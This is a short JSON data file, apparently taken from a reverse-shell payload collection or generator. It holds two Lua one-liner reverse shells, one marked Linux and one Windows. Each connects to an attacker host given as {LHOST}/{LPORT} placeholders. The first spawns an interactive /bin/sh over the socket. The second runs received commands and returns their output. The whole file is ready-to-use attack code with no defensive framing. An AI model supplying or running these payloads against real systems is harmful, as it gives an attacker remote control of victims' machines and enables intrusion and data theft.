[
  {
    "type": "lua",
    "direction": "reverse",
    "payload": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    "note": "Linux",
    "id": "lua1"
  },
  {
    "type": "lua",
    "direction": "reverse",
    "payload": "lua5.1 -e 'local host, port = \"{LHOST}\", {LPORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()' ",
    "note": "Windows",
    "id": "lua2"
  }
]